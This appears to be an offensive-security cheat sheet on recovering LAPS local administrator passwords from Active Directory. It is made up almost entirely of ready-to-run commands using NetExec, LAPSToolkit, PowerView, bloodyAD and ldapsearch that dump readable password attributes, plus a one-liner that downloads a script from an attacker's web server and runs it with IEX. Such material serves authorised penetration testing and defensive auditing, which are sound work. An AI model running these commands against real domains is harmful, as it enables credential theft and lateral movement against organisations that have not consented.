# LAPS

Local Administrator Password Solution stores per-machine local admin passwords in AD attributes (`ms-Mcs-AdmPwd` for legacy LAPS, `msLAPS-Password` / `msLAPS-EncryptedPassword` for Windows LAPS). Anyone with read rights on the attribute on a computer object can recover the local admin password for that host.

### nxc LAPS module

NetExec's `laps` module reads the LAPS attribute over LDAP and prints recovered passwords for every computer the user can read. Fast first check.

```sh title:"NetExec LAPS reader - dumps all readable LAPS passwords"
nxc ldap $domain -u $user $auth_flags -M laps
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### LAPSToolkit list computers

PowerShell module enumeration of all LAPS-managed computers from a domain-joined host.

```powershell title:"List all LAPS-managed computers via LAPSToolkit"
Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
```
<!-- cheat -->

### LAPSToolkit download and import

Download LAPSToolkit from your web server and import it.

```powershell title:"Download and import LAPSToolkit"
(New-Object System.Net.WebClient).DownloadString('http://$lhost/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
```
<!-- cheat
var lhost
-->

### LAPSToolkit delegated groups

Find the AD groups delegated rights to read LAPS passwords - tells you which group memberships to target for LAPS recovery.

```powershell title:"Find groups delegated LAPS read rights"
Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
```
<!-- cheat -->

### LAPSToolkit extended rights

Find users and groups with extended rights over LAPS password attributes.

```powershell title:"Find principals with LAPS extended rights"
Import-Module .\LAPSToolkit.ps1; Find-AdmPwdExtendedRights
```
<!-- cheat -->

### LAPSToolkit dump passwords

Dump LAPS passwords readable by the current user via LAPSToolkit.

```powershell title:"Dump all LAPS passwords visible to current user"
Get-LAPSPasswords -DomainController $rhost_name -Credential $domain\$user | Format-Table -AutoSize
```
<!-- cheat
import domain_ip
var rhost_name
var user
-->

### PowerView LAPS read

Read `ms-Mcs-AdmPwd` directly via PowerView (legacy LAPS). For Windows LAPS, query `msLAPS-Password` or `msLAPS-EncryptedPassword` instead.

```powershell title:"Read ms-Mcs-AdmPwd from a computer object via PowerView"
Get-DomainObject $rhost_name -Properties "ms-mcs-AdmPwd",name
```
<!-- cheat
var rhost_name
-->

### bloodyAD LAPS read

Read the LAPS password attribute over LDAP from Linux via bloodyAD.

```sh title:"Read ms-Mcs-AdmPwd over LDAP via bloodyAD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_computer --attr ms-Mcs-AdmPwd
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_computer
-->

### ldapsearch LAPS

Raw LDAP query for hosts where `ms-Mcs-AdmPwd` is readable. Useful when canned tools aren't available.

```sh title:"Raw LDAP search for readable ms-Mcs-AdmPwd values"
ldapsearch -x -H ldap://$rhost_ip -D "$user@$domain" -w $pass -b "$base_dn" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName
```
<!-- cheat
import domain_ip
var user
var pass
var base_dn
-->
